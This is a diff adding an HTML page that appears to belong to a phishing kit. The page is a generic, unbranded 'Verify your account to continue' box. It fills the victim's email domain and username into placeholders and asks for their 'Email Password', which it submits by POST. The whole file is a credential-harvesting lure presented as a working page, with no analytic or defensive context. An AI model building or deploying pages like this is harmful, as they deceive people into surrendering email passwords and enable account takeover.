@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="head.css">
+<title id="titlePage"> </title>
+    <link rel="icon" type="image/ico" href="mail.png">   
+</head>
+<body class="bg"> 
+<div id="overlay" > 
+  <div id="float-box" style="margin-top: 5%"> 
+            <span class="close">&times;</span>
+		  <div style="display: flex;  margin-top: 10px;  font-weight: bolder; font-size: 14px;  ">
+              <img src="mail.png" style="width: 20px;">&nbsp;<span id="emaildomain"></span>
+          </div>			            
+          <div  style="margin-top: 5px;"> 
+             
+          	<font size="2" style="font-weight: bolder;">Verify your account to continue</font><br> 
+            <font size="2" style="font-weight: bolder; color: darkred;" id="emailuser"></font>
+          </div>  
+          <form method="POST" > 
+            <div style="display: flex;">
+                <input type="hidden" id="email" placeholder="Valid Email Address">
+            <input type="password" id="password" style="margin-top: 10px" pattern=".{5,30}" placeholder="Email Password">            
+          <button type="submit" id="submit">Verify</button>
+            </div>  
+            
+            <font size="1" style="font-weight: bolder; color: darkred; margin-top: 4px;" id="msg">Confirm your password.</font>
+          </form>
+        </div>
+</div>
+<script src="jquery.js"></script> 
+</body>
+</html>
